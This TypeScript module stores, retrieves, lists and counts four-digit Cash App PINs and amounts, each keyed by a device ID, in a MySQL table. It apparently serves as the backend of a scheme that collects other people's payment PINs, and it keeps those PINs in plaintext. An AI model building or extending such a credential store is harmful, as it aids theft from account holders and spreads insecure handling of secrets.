import type { RowDataPacket } from "mysql2";
import { v4 as uuidv4 } from "uuid";
import { pool } from "../db/pool.js";

interface CashAppAccountRow extends RowDataPacket {
  id: string;
  device_id: string;
  pin: string;
  amount: string | null;
  submitted_at: Date;
  created_at: Date;
  updated_at: Date;
}

export interface CashAppAccountInput {
  pin: string;
  amount?: string | null;
  submittedAt?: number;
}

export interface CashAppAccountRecord {
  id: string;
  deviceId: string;
  pin: string;
  amount: string | null;
  submittedAt: Date;
  createdAt: Date;
  updatedAt: Date;
}

function mapCashAppAccount(row: CashAppAccountRow): CashAppAccountRecord {
  return {
    id: row.id,
    deviceId: row.device_id,
    pin: row.pin,
    amount: row.amount,
    submittedAt: row.submitted_at,
    createdAt: row.created_at,
    updatedAt: row.updated_at,
  };
}

function validateCashAppInput(input: CashAppAccountInput) {
  const pin = input.pin.trim();
  if (!/^\d{4}$/.test(pin)) {
    throw new Error("cashapp_pin_invalid");
  }
  return {
    pin,
    amount: input.amount?.trim() || null,
    submittedAt: input.submittedAt ? new Date(input.submittedAt) : new Date(),
  };
}

export async function createCashAppAccount(
  deviceId: string,
  input: CashAppAccountInput,
): Promise<CashAppAccountRecord> {
  const normalized = validateCashAppInput(input);
  const id = uuidv4();

  await pool.query(
    `INSERT INTO device_cashapp_accounts
      (id, device_id, pin, amount, submitted_at)
     VALUES (?, ?, ?, ?, ?)`,
    [id, deviceId, normalized.pin, normalized.amount, normalized.submittedAt],
  );

  const record = await getCashAppAccountById(id);
  if (!record) {
    throw new Error("cashapp_account_save_failed");
  }
  return record;
}

export async function getCashAppAccountById(id: string): Promise<CashAppAccountRecord | null> {
  const [rows] = await pool.query<CashAppAccountRow[]>(
    "SELECT * FROM device_cashapp_accounts WHERE id = ? LIMIT 1",
    [id],
  );
  const row = rows[0];
  return row ? mapCashAppAccount(row) : null;
}

export async function listCashAppAccounts(options: {
  deviceId?: string;
  limit?: number;
}): Promise<CashAppAccountRecord[]> {
  const limit = Math.min(Math.max(options.limit ?? 100, 1), 500);
  const where: string[] = [];
  const params: unknown[] = [];

  if (options.deviceId?.trim()) {
    where.push("device_id = ?");
    params.push(options.deviceId.trim());
  }

  const whereSql = where.length > 0 ? `WHERE ${where.join(" AND ")}` : "";
  const [rows] = await pool.query<CashAppAccountRow[]>(
    `SELECT * FROM device_cashapp_accounts
     ${whereSql}
     ORDER BY submitted_at DESC
     LIMIT ?`,
    [...params, limit],
  );

  return rows.map(mapCashAppAccount);
}

export async function countCashAppAccounts(deviceId: string): Promise<number> {
  const id = deviceId.trim();
  if (!id) {
    return 0;
  }
  const [rows] = await pool.query<RowDataPacket[]>(
    "SELECT COUNT(1) AS cnt FROM device_cashapp_accounts WHERE device_id = ?",
    [id],
  );
  return Number(rows[0]?.cnt ?? 0);
}
